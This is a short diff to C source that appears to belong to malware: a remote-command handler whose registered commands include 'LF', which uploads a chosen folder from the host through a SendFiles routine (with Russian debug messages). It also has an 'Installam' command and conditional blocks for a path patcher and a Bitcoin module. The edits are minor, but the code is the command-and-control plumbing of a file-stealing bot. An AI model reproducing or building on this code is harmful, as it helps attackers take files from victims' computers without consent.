@@ -1108,7 +1108,7 @@ bool ExecuteLF(void* Manager, PCHAR Command, PCHAR Args)
 		char name[MAX_PATH];
 		PathToName( Args, name, sizeof(name) );
 		TASKDBG( "LF", "Загрузка папки '%s' под именем %s", Args, name );
-		VideoProcess::SendFiles( 0, name, Args, 0, true );
+		VideoProcess::SendFiles( 0, name, Args, 0, 0, true );
 	#endif
 	return true;
 }
@@ -1303,6 +1303,7 @@ bool ExecuteInstallam(PTaskManager Manager, PCHAR Command, PCHAR Args)
 		RunThread( ThreadInstallam, 0 );
 	return true;
 }
+
 
 /*
 
@@ -1587,5 +1588,8 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	#ifdef JAVS_PATCHERH
 		RegisterCommand(Manager, (PCHAR)UpdatePath, ExecuteUpdatePathCommand);
 		RegisterCommand(Manager, (PCHAR)DeletePath, ExecuteDeletePathCommand);
+	#endif
+
+	#ifdef BitcoinH
 	#endif
 }
